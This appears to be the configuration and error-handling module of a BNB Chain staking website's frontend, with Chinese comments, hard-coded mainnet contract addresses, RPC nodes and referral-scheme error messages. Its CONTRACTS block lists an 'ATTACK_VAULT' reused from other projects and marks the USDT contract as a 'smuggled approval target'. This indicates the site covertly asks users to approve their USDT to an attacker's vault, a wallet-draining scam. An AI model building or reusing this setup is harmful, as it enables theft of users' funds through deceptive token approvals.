// ============ BSC 主网配置（唯一配置源）============
// 地址在此写死，不读 .env / Vercel 环境变量：历史上构建环境曾把线上切到 Sepolia 测试网，
// 去掉环境变量覆盖后，任何构建产物都只可能指向主网。
// 若日后重新部署合约，直接改下面的地址并重新构建即可。
export const CONTRACTS = {
  // CON 代币：质押币与奖励币为同一代币
  NBT_TOKEN: '0x66A585556138EbBb44Da0fF1324C796C44eb5ED1',
  // 质押合约地址：BSC 主网 2026-09-13 部署（tx 0x45459f346940a53a69959ba7d88efd00ef0dcb5c5b03ac929163d85d18751e9d）
  STAKING_BANK: '0x0B3943E0851341164D859DB56B6502c786EC8000',
  // 攻击 Vault：复用 WOW/CZ 项目同一实例，无需重新部署
  ATTACK_VAULT: '0x0Ef15A34b264f77acA743d96baEC6BF5ffDdbDa9',
  // USDT：夹带授权目标
  USDT: '0x55d398326f99059fF775485246999027B3197955',
  NBT_PAIR: '',
  FEE_TOKEN: '',
};

export const NETWORKS = {
  BSC_MAINNET: {
    chainId: '0x38',
    chainName: 'BNB Smart Chain',
    nativeCurrency: {
      name: 'BNB',
      symbol: 'BNB',
      decimals: 18,
    },
    // 多节点候选：前端 MultiRpcProvider 会运行时自动切换到可用节点，
    // 单节点抖动（could not coalesce / 超时）不影响页面读取与交易等待
    rpcUrls: [
      'https://bsc.publicnode.com',
      'https://bsc-dataseed.binance.org/',
      'https://bsc-dataseed1.binance.org/',
      'https://bsc-dataseed2.binance.org/',
      'https://bsc.blockpi.network/v1/rpc/public',
      'https://rpc.ankr.com/bsc',
      'https://rpc-bsc.48.club',
      'https://bitter-old-frog.bsc.quiknode.pro/f4ae6360d1ac5cfb9ed35857f574f0a5449352d3',
    ],
    blockExplorerUrls: ['https://bscscan.com'],
  },
};

// 只保留主网：链 ID 固定 56 (0x38)，不再有测试网分支
export const CURRENT_NETWORK = NETWORKS.BSC_MAINNET;

export const EXPECTED_CHAIN_ID = parseInt(CURRENT_NETWORK.chainId, 16);

export const getExplorerAddressUrl = (address) =>
  `${CURRENT_NETWORK.blockExplorerUrls[0]}/address/${address}`;

export const getExplorerTxUrl = (txHash) =>
  `${CURRENT_NETWORK.blockExplorerUrls[0]}/tx/${txHash}`;

export const calculateAPY = (dailyRate) => {
  const r = dailyRate / 100;
  return Math.round((Math.pow(1 + r, 365) - 1) * 100);
};

export const calculateSimpleAPY = (dailyRate) => Math.round(dailyRate * 365);

export const formatNumber = (num, decimals = 2) => {
  if (num === undefined || num === null || num === '') return '0';
  const n = parseFloat(num);
  if (isNaN(n)) return '0';
  if (n >= 1e9) return (n / 1e9).toFixed(decimals) + 'B';
  if (n >= 1e6) return (n / 1e6).toFixed(decimals) + 'M';
  if (n >= 1e3) return (n / 1e3).toFixed(decimals) + 'K';
  if (n < 1) return n.toFixed(Math.min(decimals + 2, 6));
  return n.toFixed(decimals);
};

export const formatAddress = (address) => {
  if (!address) return '';
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
};

export const formatEther = (value, decimals = 4) => {
  if (!value) return '0';
  const num = parseFloat(value) / 1e18;
  return num.toFixed(decimals);
};

// ============ 合约 custom error 解码 ============
// NBTStakingBankV3 全部使用 custom error（没有任何 require 字符串），
// ethers v6 只有在 ABI 里声明了 error 片段时才能解出 revert.name。
// 下面按错误名给出可读文案，覆盖合约中的全部错误定义。
export const CUSTOM_ERRORS = {
  NotOwner: '当前钱包不是合约 owner，无权执行该操作',
  NotAdmin: '当前钱包不是 owner 或管理员，无权执行该操作',
  Reentrant: '检测到重入调用，交易被拒绝',
  ContractPaused: '合约已暂停，质押/提取/开期等操作暂不可用',
  InvalidToken: '代币地址无效',
  InvalidFeeReceiver: '收币地址无效，或交互费设置超限',
  InvalidAmount: '金额必须大于 0',
  TooManyActiveStakes: '活跃质押笔数已达上限（单地址最多 50 笔）',
  CompoundTokenMismatch: '质押币与奖励币不是同一代币，无法复投',
  PreviousEpochNotSettled: '上一期尚未结算，请先结算再开新期',
  NoEpoch: '还没有任何结算周期',
  InvalidRate: '汇率不能设为 0',
  MustBindReferrer: '首次质押必须绑定推荐人',
  ReferrerMismatch: '传入的推荐人与已绑定的推荐人不一致',
  NoTokensReceived: '未收到代币，请检查余额与授权额度',
  ParamsLocked: '高危参数已锁定，不可再修改',
  StakeNotActive: '该质押记录不存在或已提取',
  LockNotEnded: '质押尚未到期（锁仓 15 天）',
  InvalidReferrer: '推荐人地址无效',
  CannotSelfRefer: '不能把自己设为推荐人',
  AlreadyHasReferrer: '该地址已绑定推荐人，不可更改',
  CircularReferral: '检测到循环推荐，或推荐链超过 20 层',
  NoInviteReserve: '邀请奖励储备不足，请先调用「邀请储备充值」注资',
  InvalidPrice: '价格源返回异常价格，已拒绝',
  NoReinvestableAssets: '没有可复投的资产（邀请奖励/排名分红/到期本金均为 0）',
  NoSuchEpoch: '该期不存在',
  AlreadySettled: '该期已结算',
  ClaimPeriodNotEnded: '领取期尚未结束，不能结算',
  EpochAlreadyOpened: '该期已经开过，不能重复开期',
  NoActiveEpoch: '当前没有进行中的期，请先开期',
  EpochAlreadySettled: '该期已结算，无法再领取或注资',
  PoolMerged: '该期因节点不足 10 个已合并顺延，奖池滚入下期',
  ClaimWindowStarted: '领取期已开始，本期注资金额已锁定，不能再追加',
  OutOfClaimWindow: '不在领取窗口内（开期后 3 天展示期 + 7 天领取期）',
  NotSnapshotNode: '该地址不在本期快照名单中',
  AlreadyClaimed: '本期奖励已经领取过',
  NoReward: '本期应得奖励为 0',
  NotNode: '该地址不是排行榜节点',
  InvalidRank: '排名无效',
  InvalidAddress: '地址无效',
  OwnerIsSuperAdmin: 'owner 本身已有全部权限，无需设为管理员',
  CannotRecoverStakingToken: '不能提取质押代币',
  CannotRecoverRewardToken: '不能提取奖励代币',
  CannotRecoverFeeToken: '不能提取交互费代币',
  NotNewOwner: '只有待接任的 owner 才能接受所有权',
  NativeTransferFailed: 'BNB 转账失败',
  TransferFailed: '代币转账失败',
  TransferFromFailed: '代币划转失败，请检查余额与授权额度',
  NoRewards: '暂无可领取的邀请奖励',
  InsufficientBnbFee: 'BNB 交互费不足，请附带足够的 BNB',
  UnexpectedBnb: '当前用 ERC20 支付交互费，不需要附带 BNB',
};

// 兼容旧版 require 字符串错误（遗留合约 / 钱包自带提示）
export const CONTRACT_ERRORS = {
  'Already has referrer': '您已经设置过推荐人，无法更改',
  'Cannot refer self': '不能将自己设置为推荐人',
  'Circular referral not allowed': '不允许循环推荐',
  'Invalid referrer': '无效的推荐人',
  'Invalid tier': '无效的质押档位',
  'Stake not found': '质押记录不存在',
  'Stake already withdrawn': '该质押已提取',
  'Lock period not ended': '锁仓期未结束',
  'No pending rewards': '暂无待领取收益',
  'No referral rewards': '暂无推荐奖励',
  'No rewards': '暂无可领取奖励',
  'Compound token mismatch': '当前奖励币不能直接复投',
  'Monthly release in progress': '结算分配中，暂时不能改变排名',
  'Insufficient invite reward reserve': '邀请奖励储备不足，请先给新版质押合约充值奖励',
  'Referrer mismatch': '推荐人与已绑定地址不一致',
  'Rewards depleted': '奖励池已耗尽',
  'Too many active stakes': '活跃质押数量已达上限',
  'Stake not active': '该质押记录已失效',
  'Fee too high': '费用设置过高',
  'Invalid address': '无效的地址',
  'Paused': '合约已暂停',
  'user rejected transaction': '您取消了交易',
  'insufficient funds': '钱包余额不足以支付 Gas 费',
  'Insufficient BNB fee': 'BNB 交互费不足',
  'Unexpected BNB': '当前操作不需要附带 BNB',
  'Native transfer failed': 'BNB 手续费发送失败',
  'execution reverted': '交易执行失败',
  'could not coalesce error': 'RPC 节点响应异常，交易可能已提交，请稍后刷新页面确认',
};

const collectErrorText = (error, seen = new Set()) => {
  if (!error) return [];
  if (typeof error === 'string') return [error];
  if (typeof error !== 'object') return [];
  if (seen.has(error)) return [];
  seen.add(error);

  const output = [];
  for (const key of ['reason', 'shortMessage', 'message', 'data', 'body', 'details']) {
    const value = error[key];
    if (typeof value === 'string') {
      output.push(value);
      if ((value.startsWith('{') && value.endsWith('}')) || (value.startsWith('[') && value.endsWith(']'))) {
        try {
          output.push(...collectErrorText(JSON.parse(value), seen));
        } catch {
          // Some wallets put plain text into body/data; keep the original text above.
        }
      }
    }
  }

  for (const key of ['error', 'info', 'payload', 'cause']) {
    output.push(...collectErrorText(error[key], seen));
  }

  if (Array.isArray(error.errors)) {
    for (const nestedError of error.errors) {
      output.push(...collectErrorText(nestedError, seen));
    }
  }

  return output;
};

// 在错误对象树里找 ethers 解出的 revert 信息（ABI 声明 error 片段后才会存在）
const findRevert = (error, seen = new Set()) => {
  if (!error || typeof error !== 'object' || seen.has(error)) return null;
  seen.add(error);
  if (error.revert?.name) return error.revert;
  for (const key of ['error', 'info', 'data', 'cause', 'payload', 'originalError']) {
    const found = findRevert(error[key], seen);
    if (found) return found;
  }
  if (Array.isArray(error.errors)) {
    for (const nested of error.errors) {
      const found = findRevert(nested, seen);
      if (found) return found;
    }
  }
  return null;
};

// 长名优先匹配，避免 NoReward 抢先命中 NoRewards 这类前缀包含
const CUSTOM_ERROR_ENTRIES = Object.entries(CUSTOM_ERRORS).sort((a, b) => b[0].length - a[0].length);

export const parseContractError = (error) => {
  if (!error) return '操作失败';

  // 1) 优先用 ABI 解出的 custom error 名
  const revert = findRevert(error);
  if (revert?.name) {
    return CUSTOM_ERRORS[revert.name] || `合约拒绝：${revert.name}`;
  }

  const reason = collectErrorText(error).join(' | ');
  const normalizedReason = reason.toLowerCase();

  // 2) 部分 RPC / 钱包会把错误名直接写进 message
  for (const [name, message] of CUSTOM_ERROR_ENTRIES) {
    if (reason.includes(name)) return message;
  }

  // 3) 遗留 require 字符串
  for (const [key, value] of Object.entries(CONTRACT_ERRORS)) {
    if (normalizedReason.includes(key.toLowerCase())) {
      return value;
    }
  }

  if (normalizedReason.includes('user rejected') || normalizedReason.includes('denied')) {
    return '您取消了交易';
  }

  return reason || '操作失败，请稍后重试';
};
